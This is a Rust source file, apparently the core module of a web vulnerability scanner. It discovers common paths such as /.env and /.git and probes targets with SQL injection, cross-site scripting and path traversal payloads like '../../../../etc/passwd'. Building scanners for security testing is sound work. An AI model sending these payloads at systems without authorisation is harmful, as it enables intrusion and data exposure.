pub mod payloads;
pub mod detector;
pub mod exploiter;
pub mod baseline;
pub mod mutation;
pub mod analyzer;
pub mod sqli_expert;
pub mod sqli_advanced;
pub mod sqli_payloads;
pub mod xss_expert;
pub mod xss_advanced;
pub mod xss_payloads;
pub mod ssti_expert;
pub mod idor_detector;
pub mod ssrf_detector;
pub mod anomaly_detector;
pub mod threat_intelligence;
pub mod behavioral_analyzer;
pub mod integration_tests;
pub mod test_fixtures;
pub mod performance_benchmark;
pub mod release_config;
pub mod error_handling;
pub mod ml_detection;
pub mod api_scanner;
pub mod endpoint_fuzzer;
pub mod deserialization;
pub mod gadget_analyzer;
pub mod websocket_scanner;
pub mod parallel;
pub mod scoring;

use crate::Result;
use crate::proxy::http_parser::HttpRequest;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::time::Duration;

pub use detector::{Vulnerability, VulnerabilityDetector};
pub use exploiter::{Exploit, ExploitFinder};

#[derive(Debug, Clone)]
pub struct Scanner {
    client: Client,
    target: String,
    aggressive: bool,
}

impl Scanner {
    pub fn new(target: String, aggressive: bool) -> Self {
        Self {
            client: Client::new(),
            target,
            aggressive,
        }
    }

    pub fn scan_request(&self, req: &HttpRequest) -> Vec<Vulnerability> {
        VulnerabilityDetector::scan_request(req)
    }

    pub async fn scan(&self) -> Result<Vec<Vulnerability>> {
        let mut vulns = Vec::new();

        // Discover common endpoints
        let endpoints = self.discover_endpoints().await?;

        // Test each endpoint for vulnerabilities
        for endpoint in endpoints {
            let url = format!("{}{}", self.target, endpoint);

            // Test SQL Injection
            let sqli_vulns = self.test_sql_injection(&url).await?;
            vulns.extend(sqli_vulns);

            // Test XSS
            let xss_vulns = self.test_xss(&url).await?;
            vulns.extend(xss_vulns);

            // Test Path Traversal
            let path_vulns = self.test_path_traversal(&url).await?;
            vulns.extend(path_vulns);
        }

        Ok(vulns)
    }

    async fn discover_endpoints(&self) -> Result<Vec<String>> {
        let common_paths = vec![
            "/",
            "/index.html",
            "/admin",
            "/api",
            "/login",
            "/register",
            "/search",
            "/products",
            "/users",
            "/config",
            "/backup",
            "/test",
            "/debug",
            "/.git",
            "/.env",
            "/web.config",
            "/xmlrpc.php",
            "/wp-admin",
            "/wp-login.php",
            "/wp-json",
            "/api/v1",
            "/api/users",
            "/rest",
            "/graphql",
        ];

        let mut discovered = Vec::new();

        for path in common_paths {
            if let Ok(response) = self
                .client
                .get(format!("{}{}", self.target, path))
                .timeout(Duration::from_secs(5))
                .send()
                .await
            {
                if response.status().as_u16() != 404 {
                    discovered.push(path.to_string());
                }
            }
        }

        Ok(discovered)
    }

    async fn test_sql_injection(&self, url: &str) -> Result<Vec<Vulnerability>> {
        let mut vulns = Vec::new();

        let payloads = vec![
            ("id", "' OR '1'='1"),
            ("id", "1' AND '1'='1"),
            ("id", "1' UNION SELECT NULL--"),
            ("search", "' OR 1=1--"),
            ("q", "admin' --"),
        ];

        for (param, payload) in payloads {
            let test_url = format!("{}?{}={}", url, param, urlencoding::encode(payload));

            if let Ok(response) = self
                .client
                .get(&test_url)
                .timeout(Duration::from_secs(5))
                .send()
                .await
            {
                if let Ok(body) = response.text().await {
                    // Simple detection - improved responses often indicate SQLi
                    if body.to_lowercase().contains("error")
                        || body.to_lowercase().contains("warning")
                        || body.to_lowercase().contains("sql")
                    {
                        let exploits =
                            ExploitFinder::find_exploits("SQL Injection", Some(&test_url))
                                .unwrap_or_default();

                        vulns.push(Vulnerability {
                            id: uuid::Uuid::new_v4().to_string(),
                            vuln_type: "SQL Injection".to_string(),
                            severity: "Critical".to_string(),
                            url: test_url.clone(),
                            parameter: param.to_string(),
                            payload: payload.to_string(),
                            evidence: "Payload response suggests SQL vulnerability".to_string(),
                            exploits,
                        });
                    }
                }
            }
        }

        Ok(vulns)
    }

    async fn test_xss(&self, url: &str) -> Result<Vec<Vulnerability>> {
        let mut vulns = Vec::new();

        let payloads = vec![
            ("search", "<script>alert(1)</script>"),
            ("q", "'\"><script>alert('xss')</script>"),
            ("id", "javascript:alert(1)"),
            ("name", "<img src=x onerror=alert(1)>"),
        ];

        for (param, payload) in payloads {
            let test_url = format!("{}?{}={}", url, param, urlencoding::encode(payload));

            if let Ok(response) = self
                .client
                .get(&test_url)
                .timeout(Duration::from_secs(5))
                .send()
                .await
            {
                if let Ok(body) = response.text().await {
                    // If payload is reflected in response, it's likely vulnerable
                    if body.contains(payload) || body.contains(&payload.replace("\"", "&quot;")) {
                        let exploits = ExploitFinder::find_exploits("XSS", Some(&test_url))
                            .unwrap_or_default();

                        vulns.push(Vulnerability {
                            id: uuid::Uuid::new_v4().to_string(),
                            vuln_type: "XSS".to_string(),
                            severity: "High".to_string(),
                            url: test_url.clone(),
                            parameter: param.to_string(),
                            payload: payload.to_string(),
                            evidence: "Payload reflected in response".to_string(),
                            exploits,
                        });
                    }
                }
            }
        }

        Ok(vulns)
    }

    async fn test_path_traversal(&self, url: &str) -> Result<Vec<Vulnerability>> {
        let mut vulns = Vec::new();

        let payloads = vec![
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
        ];

        for payload in payloads {
            let test_url = format!("{}?file={}", url, urlencoding::encode(payload));

            if let Ok(response) = self
                .client
                .get(&test_url)
                .timeout(Duration::from_secs(5))
                .send()
                .await
            {
                if let Ok(body) = response.text().await {
                    if body.contains("root:") || body.contains("[boot loader]") {
                        let exploits = ExploitFinder::find_exploits("Path Traversal", Some(&test_url))
                            .unwrap_or_default();

                        vulns.push(Vulnerability {
                            id: uuid::Uuid::new_v4().to_string(),
                            vuln_type: "Path Traversal".to_string(),
                            severity: "High".to_string(),
                            url: test_url.clone(),
                            parameter: "file".to_string(),
                            payload: payload.to_string(),
                            evidence: "Sensitive file content exposed".to_string(),
                            exploits,
                        });
                    }
                }
            }
        }

        Ok(vulns)
    }
}
